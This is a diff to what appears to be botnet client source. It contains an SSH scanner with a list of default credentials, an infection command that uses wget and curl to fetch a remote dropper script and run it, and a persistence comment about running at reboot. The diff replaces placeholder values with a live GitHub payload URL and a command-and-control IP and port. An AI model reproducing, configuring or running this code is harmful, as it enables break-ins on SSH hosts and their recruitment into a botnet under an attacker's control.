@@ -71,7 +71,7 @@ def _SSHScan(_num, _wait, _tmout):
     _crdntl = ["root:toor", "root:root", "admin:1234", "admin:admin", "guest:guest"]
     _blklst = ["127.0", "10.0", "192.168"]
 
-    _payloadURL = 'http://0.0.0.0/downloader.sh'
+    _payloadURL = 'https://raw.githubusercontent.com/Lettable/exile-botnet/refs/heads/main/server%2Bclient/dropper/rekt.sh'
     _infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget {}; curl -O {}; chmod 777 downloader.sh; sh downloader.sh'.format(_payloadURL, _payloadURL)
     
     # install SSH module
@@ -934,8 +934,8 @@ def _sheol():
 
 def main():
     # IP/Port to C2 server
-    EIP = '0.0.0.0'
-    PRT = 4444
+    EIP = '154.81.179.195'
+    PRT = 9088
     
     
     # ensure client run @ reboot
